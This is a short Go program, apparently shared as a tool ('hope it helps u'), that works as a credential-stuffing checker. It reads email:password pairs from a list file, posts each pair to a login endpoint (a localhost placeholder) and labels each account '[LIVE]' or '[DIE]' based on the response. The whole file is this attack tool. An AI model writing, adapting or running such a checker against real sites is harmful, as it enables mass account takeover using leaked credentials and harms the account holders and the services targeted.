//    _                       _____                          _     _ 
//   | |                     |  __ \                        | |   (_)
//   | |    _   _  __ _ _ __ | |  | | _____   _____  ___ ___| |__  _ 
//   | |   | | | |/ _` | '_ \| |  | |/ _ \ \ / / _ \/ __/ __| '_ \| | hope it helps u
//   | |___| |_| | (_| | | | | |__| |  __/\ V /  __/ (_| (__| | | | |
//   |______\__,_|\__,_|_| |_|_____/ \___| \_/ \___|\___\___|_| |_|_|
//                                                                   
//          

package main
import "os"
import "log"
import "fmt"
import "net/http"
import "net/url"
import "io/ioutil"
import "bufio"
import "strings"
func main() {

fmt.Println("Starting Checker - GoLang... \n")
start()
	
}

func start() {
    file, err := os.Open("mylist.txt")
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()
	fmt.Println("Checking...")
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

	fields := strings.Split(scanner.Text(), ":")
	resp, err := http.PostForm("http://localhost/auth/DoLogin.php",
		url.Values{"email": {fields[0]}, "password": {fields[1]}})
if err != nil {
	
}
defer resp.Body.Close()
body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}
		
		//_, err = os.Stdout.Write(body)


		req := string(body)

		if strings.Contains(req,"live msg"){
			fmt.Println("[LIVE] ", fields[0],fields[1])
			
		}else{
			fmt.Println("[DIE] ", fields[0],fields[1])
		}
		
    }

    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }
}